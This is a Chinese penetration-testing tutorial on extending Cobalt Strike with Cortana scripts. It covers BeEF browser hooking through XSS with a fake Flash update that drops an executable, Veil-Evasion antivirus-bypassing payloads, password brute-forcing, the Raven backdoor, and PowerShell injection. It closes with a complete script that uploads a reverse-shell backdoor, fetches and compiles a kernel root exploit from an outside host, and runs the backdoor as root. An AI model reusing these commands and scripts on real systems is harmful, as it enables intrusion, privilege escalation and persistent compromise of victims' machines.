# 强化你的Cobalt strike之Cortana

0x00 Cortana console
====================

* * *

![Alt text](http://drops.javaweb.org/uploads/images/cb2479374ea1c8ba9d1cb430d6214ce8ad07c39e.jpg)

Cortana是可以用于Cobalt strike以及Armitage的脚本，通过加载cortana可以向Cobalt strike中导入新的第三方工具，最大的好处就是各种第三方工具都进行了可视化，你可以通过点击而不是通过命令行来完成一些操作，当然，通过定制cortana脚本，你可以在渗透测试过程中很方便的做一些批量操作或者自动化攻击等。本篇文章主要选取了一些现有的cortana脚本，来进行简单的介绍。

你可以通过如下命令下载cortana-scripts：

```
root@kali:~# git clone https://github.com/rsmudge/cortana-scripts.git

```

> 本次测试使用的是Cobalt strike2.5，下载地址:[戳我](https://userscloud.com/izezz61j564p)(自行验证安全性)

除了可视化操作，cortana也可以使用命令行操作，依此点击View->Script Console，则可打开，使用Help可以看到如下几个命令：

```
cortana> help   

Commands
--------
askoff #参数为cna脚本，关闭脚本交互功能
askon #参数为cna脚本，开启脚本交互功能
help #查看帮助信息
load #参数为路径，加载Cortana脚本
logoff #参数为cna脚本，关闭脚本日志记录
logon #参数为cna脚本，开启脚本日志记录
ls #列出加载的脚本
proff #参数为cna脚本，关闭脚本分析器
profile #参数为cna脚本，查看脚本简介
pron #参数为cna脚本，开启脚本分析器
reload #参数为cna脚本，重新加载脚本
troff #参数为cna脚本，关闭脚本跟踪功能
tron #参数为cna脚本，开启脚本跟踪功能
unload #参数为cna脚本，卸载脚本

```

下面将介绍几个好用的脚本。

0x01 Beef_strick
================

* * *

Beef是一款针对浏览器的渗透测试工具，之前三好学生师傅已经对他有一个比较详细的介绍，而beef_strick则是可以在Cobalt strike及Armitage中加载Beef的一个Cortana脚本，要使用此脚本，首先要先下载安装msf的beef插件。

```
root@kali:~# git clone https://github.com/xntrik/beefmetasploitplugin.git
root@kali:~# cd beefmetasploitplugin/
root@kali:~/beefmetasploitplugin# cp plugins/* /usr/share/metasploit-framework/plugins/
root@kali:~/beefmetasploitplugin# cp -R lib/* /usr/share/metasploit-framework/lib/

```

安装依赖库，执行：

```
root@kali:~# gem install hpricot
root@kali:~# gem install json  

```

> 如果不能更新，可以换成淘宝的ruby源，地址为[https://ruby.taobao.org/](https://ruby.taobao.org/)

启动msf:

```
root@kali:~# service postgresql start
root@kali:~# msfconsole

```

加载beef

```
msf > load beef

```

在这里有个坑，就是可能会碰到这个错误：

![Alt text](http://drops.javaweb.org/uploads/images/7648b7bbdfa6ae7c80fc8087cd3892f2b338618e.jpg)

经过多次研究最终找到解决方案，直接复制：

```
cp -R /var/lib/gems/2.1.0/gems/hpricot-0.8.6/lib/* /usr/lib/ruby/vendor_ruby/

```

现在再启动msf，就可以加载beef了，如下图：

![Alt text](http://drops.javaweb.org/uploads/images/51fc7328dd47cf6c74fab93ebb97cc627186cd40.jpg)

进入到cortana-scripts的beef_strike目录（测试发现，最新版本的貌似有问题，所以找到了历史版本的来做测试：地址[请戳我](https://raw.githubusercontent.com/rsmudge/cortana-scripts/5cb704474bd59bac553bd4e3e17ab62a9bfc5a39/beef_strike/beef_strike.cna)），修改beef_strike.cna文件，将import的目录改到当前beef_strike的目录:

![Alt text](http://drops.javaweb.org/uploads/images/f279d42e952823705ab3e4d78136b51402a6a734.jpg)

除此之外，下载以下jar放到lib目录：

```
root@kali:~/beef_strike# cd lib
root@kali:~/beef_strike/lib/# wget http://evi1cg.me/lib.rar #老外整理的jar包，请自行验证安全性，不放心可以自己下载相应jar包
root@kali:~/beef_strike/lib/# unrar x lib.rar

```

之后运行cobaltstrike或者armitage(不支持cobaltstrike3.0)，以下以cobaltstrike做示例：

首先加载beef_strike，依此点击cobaltstrike->Scripts->load，选择beef_strike.cna

![Alt text](http://drops.javaweb.org/uploads/images/0596f395f2d24c510b28460f195b366790e60901.jpg)

连接beef，选择Attacks->BeEF Strike->Start->control BeFF service，配置beef路径，然后点击strat开启beef服务，之后连接beef服务，如下图：

![Alt text](http://drops.javaweb.org/uploads/images/1696e02d005682e8b3d311f2b9650c0dde26e751.jpg)

点击Conect之后填入beef服务地址，用户名，密码就可以连接beef了，这里比较重要的是这个key，如下图：

![Alt text](http://drops.javaweb.org/uploads/images/7c7dadf24d927c77a7c96703a9394b1abeaad731.jpg)

复制这个key，在连接处那里点击key，并将此值填入，就可以正常使用了。

![Alt text](http://drops.javaweb.org/uploads/images/b4cbd281f4cf4c81fc646049c02667f60ce025c6.jpg)

只需要将[http://192.168.74.144:3000/hook.js](http://192.168.74.144:3000/hook.js)插入存在xss的网站，或者以任意方式执行该js，beef上面就可以看到主机上线了，尝试访问[http://192.168.74.144:3000/demos/basic.html](http://192.168.74.144:3000/demos/basic.html)测试：

![Alt text](http://drops.javaweb.org/uploads/images/079226324145bcd5976d0fc9276f0b3229a64371.jpg)

选择一个计算机，点击右键，beef，可以看到其基本信息，右键可以看到beef更多的功能：

![Alt text](http://drops.javaweb.org/uploads/images/8dd6cbf628639c80ddbfe20c53d25f3d0ce18ddf.jpg)

比如社会工程学工具里面的fake flash update，点击此按钮之后输出如下参数配置：

```
"payload_uri":"http://192.168.74.144:81/download/test.exe","image":"http://192.168.74.145:3000/demos/adobe_flash_update.png"

```

如下图：

![Alt text](http://drops.javaweb.org/uploads/images/0721a4bd60464dd58d6b20d1cb39c7f890dc7373.jpg)

之后受害者就会看到一个升级信息：

![Alt text](http://drops.javaweb.org/uploads/images/ccdb3ccb99aa5a6fac61599f4147851e109d63ce.jpg)

点击以后就会下载我们指定的exe。

更多的功能在：

![Alt text](http://drops.javaweb.org/uploads/images/24794f485af996710a131080db4bf70a79513e64.jpg)

这里可以设置自动运行的多个命令，有兴趣的小伙伴可以继续进行研究，具体Beef使用详见：[浏览器利用框架BeEF测试](http://drops.wooyun.org/tips/9929)。

0x02 Veil_evasion
=================

* * *

Veil是一款利用Metasploit框架生成相兼容的Payload工具，并且在大多数网络环境中Veil 能绕过常见的杀毒软件，可以使用如下命令下载：

```
root@kali:~# git clone https://github.com/Veil-Framework/Veil-Evasion.git

```

下载以后进行配置安装：

```
root@kali:~# cd Veil-Evasion/setup/
root@kali:~/Veil-Evasion/setup# ./setup.sh

```

之后就安装python等一系列环境就可以正常使用了。

加载Veil_evasion，依此点击cobaltstrike->Scripts->load，选择Veil_evasion.cna，之后输入Veil-Evasion.py的绝对路径就成功加载 Veil_evasion了，如下图：

![Alt text](http://drops.javaweb.org/uploads/images/d59ad6349f02357078b32de190c42cf1724aed09.jpg)

如果Veil_evasion路径输入错误，可以再set Veil_evasion Path处修改。

点击Generate,就可以看到生成payload界面：

![Alt text](http://drops.javaweb.org/uploads/images/845967417964fc44e79bbfffd1544766eb91e25b.jpg)

通过双击Payload，MSFPayload可以选择不同的生成方式，例如：

Payload选择c/meterpreter/rev_tcp,MSFPayload选择windows/meterpreter/reverse_tcp，`一定要选同类型的`，设置监听ip及端口以后，点击Generate，则可以看到生成的路径，点击ok则可生成payload，如下图：

![Alt text](http://drops.javaweb.org/uploads/images/3a50725b96a595ecb10c74a53eb3aee08862f096.jpg)

0x03 Login_autopwn
==================

此脚本可用于用户口令破解，可以自动化测试多个服务，也可以针对单个服务进行口令破解，可破解的服务包括ssh,smb,ftp,telnet,vnc,vmauthd,pcanywhere,mssql,mysql等，使用前需要修改字典路径：

![Alt text](http://drops.javaweb.org/uploads/images/8d1ceb69d0a9ffcd2ead93a01f6c2084ed5cd9a8.jpg)

以及john字典路径：

![Alt text](http://drops.javaweb.org/uploads/images/5ef624c7bdd426f8e5b2985682aa8be58ca0bf37.jpg)

修改以后，依此点击cobaltstrike->Scripts->load，选择login_autopwn.cna，之后通过点击View->Script Console的打开Cortana,则可看到已经加载 login_autopwn：

![Alt text](http://drops.javaweb.org/uploads/images/6f5e676fe89bb5a9f29b1971a7159a35e4c3d85a.jpg)

输入help，可以查看命令：

![Alt text](http://drops.javaweb.org/uploads/images/87f11e49cae05f091be9f8026499bcfa09c742bd.jpg)

获取服务信息之后，直接输入start则可以进行自动化口令探测，当然也可以选择某个模块来进行探测，下面是一个demo:

[![IMAGE ALT TEXT](http://static.wooyun.org//drops/20151130/2015113007173856541.png)](http://v.youku.com/v_show/id_XMTM5NzcyODUyOA==.html)

0x04 Raven
==========

* * *

Raven是一个Windows后门，他可以访问攻击者控制的服务器，下载RAW shellcode，如果代码可用，他将将代码注入到其他进程中，可以通过","来创建多个URL列表，Raven将会采用循环的方式进行尝试，安装Raven以后，他每隔5分钟会访问依此控制服务器，安装方法为：

1.  复制raven.dll 到 c:\windows\linkinfo.dll。
2.  安装raven.exe，可以添加注册表或者添加服务。

Cortana script中已经集成了Raven的使用脚本，使用方式如下：

**step1**：打开终端，开启web服务

```
root@kali:~# service apache2 start

```

**step2**：依次点击View->Script console

**step3**：加载server.cna,client.cna

> 加载server.cna之前确保web根目录配置正确

**step4**：依此点击View->Raven

**step5**：点击Export EXE，配置服务器地址，http://ip/foo 生成exe

**step6**：运行exe，之后会看到这样：

![Alt text](http://drops.javaweb.org/uploads/images/9472cbb192699ed2e72bff8c978f3af5c3cc72f1.jpg)

**step7**：开启msf监听，使用windows/meterpreter/reverse_tcp ，端口为4444。

**step8**：当有客户端连入时，右键，Meterp tcp,端口为之前的端口，则可获取会话。

0x05 Others
===========

* * *

*   **QRcode**：用于生成网址的二维码，它使用了google的api，修改一下就可以使用了。
*   **annoy**：用于骚扰用户的小脚本，包括弹框，禁用鼠标、键盘，关进程，关机等。
*   **icons**：增加了很多图标，看起来会更炫酷。
*   **autoDiscover**：用于发现新的网络。
*   **autoarp**：arp扫描，用于发现网络主机。
*   **autofind**：用于查找一些指定文件并下载。
*   **autohack**：这里共有三个脚本，`autohack`用于自动攻击，当发现22端口时，使用对应的模块进行暴力破解，发现445端口则尝试使用ms08_067,自己可以根据自己的需要进行修改；`autohash`用于自动执行提权并进行hashdump操作，读取到的hash将存入数据库，执行creds则可以看到存储的hash信息；`autopsexec`用于发现445端口开放时，使用psexec来测试登陆，使用的密码为数据库存储的hash信息。
*   **autoscan**：自动扫描脚本，这里也有俩，`automsfscan`用于在hosts列表增加时自动执行msfscan操作；`autonessus`将在hosts列表增加时自动执行nessus扫描。
*   **av-bypass-demo**：这个脚本是在使用psexec时， 自动对payload进行免杀。免杀使用的源码来自于https://github.com/rsmudge/metasploit-loader
*   **beacon**：增加了右键功能，并且为beacon增加了一个图片，看起来更酷炫了。
*   **binaries**：用于Linux下替换文件。
*   **differ**：用于提示发现的新增加的服务。
*   **eval**：一个测试脚本，可以参考器为Cortana编写命令行功能。
*   **events-table**：增加查看事件功能，加载以后，使用可以通过View -> Events打开。
*   **idlewatch**：查看用户的空闲时间，并以带颜色的小人图标展示，无图标->未知空闲时间；绿色图标->用户正在使用；蓝色图标->用户活跃在5分钟之内;黄色图标->用户活跃在30分之内；红色图标->用户无效。
*   **import_creds**：此脚本用来将用户凭证导入msf数据库。使用方式为进入cortana命令行，使用import_creds进行导入。
*   **int128scripts**：int128写的一些脚本，现在有四个，`auto_crack`是利用msf的jtr_crack_fast对用户凭证进行破解的脚本；`find_hosts`是使用nmap进行扫描的脚本；`find_hosts_ping_large_subnet`是对于一个较大的子网指定端口进行快速扫描的脚本；`infect`是一个创建后门的脚本，Windows下面创建 metsvc后门并添加用户开始3389端口，Linux下面创建用户，添加后门并创建计划任务，使用前记得修改参数。
*   **irc-client**：一个250行的IRC客户端Cortana脚本。
*   **login_logout**：用于linux系统跟踪用户登陆信息。
*   **multi-meterpreter**：用于对多个系统同事执行命令。
*   **Botvoice**：一个比较好玩儿的功能，能够在使用Cobalt Strike提供语音帮助。
*   **new_payload**：一个脚本示例，用于替换payload。
*   **post-play**：此脚本用于自动化执行脚本，可以加载msf的ruby脚本或者shell脚本。当获取会话之后会自动执行。
*   **pt_autodoc**：此脚本可以监控主机以及服务信息，并将这些数据存入Mysql数据库，同时随时进行更新，可以使用图形化工具比如gephi来观测数据的变化。
*   **rc_loader**：快速加载rc脚本的脚本。
*   **references**：写一些菜单的举例脚本。
*   **user_hunter**：获取用户的脚本。能方便的找到域管理登陆的电脑。
*   **safetynet**：这个脚本允许用户向meterpreter会话中注入'safetynet' payload。
*   **Sniffer**：此脚本用于开启嗅探功能。
*   **vulns**：示例脚本，用于显示漏洞信息。
*   **vy_con**：使用此脚本可以控制和管理Vyatta的路由器。

0x06 POSH-Commander
===================

* * *

在Powrshell如火如荼的时候，怎么能缺少Powershell相关的脚本呢？rvrsh3ll在github开源了一个与Powershell相关的Cortana脚本，使用此脚本可以通过可视化操作远程注入powershell脚本到计算机内存，下载地址为：

```
root@kali:~# git clone https://github.com/rvrsh3ll/POSH-Commander.git

```

下载以后，将remote_powershell.rb复制到metasploit-framework/modules/post/windows/manage/powershell/ 目录：

```
root@kali:~# cp POSH-Commander/msfmodule/remote_powershell.rb /usr/share/metasploit-framework/modules/post/windows/manage/powershell/

```

之后打开msf的console界面，执行如下命令：

```
msf> reload_all

```

依此点击cobaltstrike->Scripts->load，加载posh_commander.cna，当获取meterpreter会话以后，将会看到新增的powershell攻击模块：

![Alt text](http://drops.javaweb.org/uploads/images/a11435a0a2322100bb0af9dc2d9bb991bfac9cf8.jpg)

选择其中的Veil-PowerView，输入脚本地址，然后就可以选择加载的模块了：

![Alt text](http://drops.javaweb.org/uploads/images/c9c8c5779c46265c2486d332a9410d3c856f30ca.jpg)

之后可以双击单个模块，添加相应参数然后运行该Powershell脚本。原脚本路径有点问题，不想改的话可以直接试用[这个](https://raw.githubusercontent.com/Ridter/Cortana/master/POSH-Commander/posh_commander.cna)。

测试执行HOST命令，选择Custom Local Command，输入HOST，运行之后可以看到运行返回的结果：

![Alt text](http://drops.javaweb.org/uploads/images/10850877ff6257ca5b1735755bfad7df89983215.jpg)

0x07 定制自己的Cortana
=================

* * *

除了以上的脚本，为了方便我们还可以自己编写属于自己的Cortana脚本，编写示例在Cortana scripts里面已经有了一些，如果有兴趣，你可以看看这个：

*   [Cortana教程](http://www.fastandeasyhacking.com/download/cortana/cortana_tutorial.pdf)
*   [Cortana编写示例](http://security-is-just-an-illusion.blogspot.com/2013/11/one-day-with-cortana-script-engine.html)

比如下面是一个自动对2.6.36内核linux自动提权的脚本：

```
# Auto Rooting < 2.6.36 Menu for Cobalt Engine v0.1 
popup shell {
 if (host_os(session_host($1)) eq "Linux") {
     menu "Auto Rooting" {
           item "Auto Rooting < 2.6.36" {
               println("Auto Rooting");
                                # Generate Payload
                                $r_lport = random_port();
                                $backdoor = generate("linux/x86/meterpreter/reverse_tcp", lhost(), $r_lport, %(), "elf");
                                $handle2 = openf(">/tmp/linux_backdoor_$r_lport");
                                writeb($handle2, $backdoor);
                                closef($handle2);  

                                shell_upload($1, "/tmp/linux_backdoor_$r_lport", "/tmp/linux_backdoor_$r_lport");

                                # Launch our aux shells
                                handler("linux/x86/meterpreter/reverse_tcp", $r_lport, %(LHOST => lhost()));

                                # Rooting
                                s_cmd($1, "wget http://downloads.securityfocus.com/vulnerabilities/exploits/44219.c");
                              s_cmd($1, "gcc 44219.c -o rootme_1");
                                s_cmd($1, "chmod +x rootme_1");
                                s_cmd($1, "chmod 0777 rootme_1");
                               s_cmd($1, "./rootme_1");
                                sleep(10 * 1000);
                                s_cmd($1, "chmod +x /tmp/linux_backdoor_$r_lport");
                                s_cmd($1, "chmod 0777 /tmp/linux_backdoor_$r_lport");
                               s_cmd($1, "chown root:root /tmp/linux_backdoor_$r_lport");
                              s_cmd($1, "/tmp/linux_backdoor_$r_lport");
                              s_cmd($1, "exit");

                                db_sync();  
           }
       }
   }
}

```

0x08 小结
=======

* * *

使用Cortana脚本可以让我们更加便捷的使用Cobalt strike，并能更加方便的进行自动化攻击，希望对渗透测试中的你有所帮助。

0x09 参考
=======

* * *

1.  [http://security-is-just-an-illusion.blogspot.com/2013/11/one-day-with-cortana-script-engine.html](http://security-is-just-an-illusion.blogspot.com/2013/11/one-day-with-cortana-script-engine.html)
2.  [http://www.rvrsh3ll.net/blog/offensive/point-click-powershell-pwn/](http://www.rvrsh3ll.net/blog/offensive/point-click-powershell-pwn/)
3.  [https://www.veil-framework.com/veil-evasion-cortana-integration/](https://www.veil-framework.com/veil-evasion-cortana-integration/)
4.  [http://www.fastandeasyhacking.com/download/c/cortana_defcon.pdf](http://www.fastandeasyhacking.com/download/c/cortana_defcon.pdf)
5.  [http://blog.cobaltstrike.com/2013/03/13/howto-integrate-third-party-tools-with-cortana/](http://blog.cobaltstrike.com/2013/03/13/howto-integrate-third-party-tools-with-cortana/)

本文由evi1cg原创并首发于乌云drops，转载请注明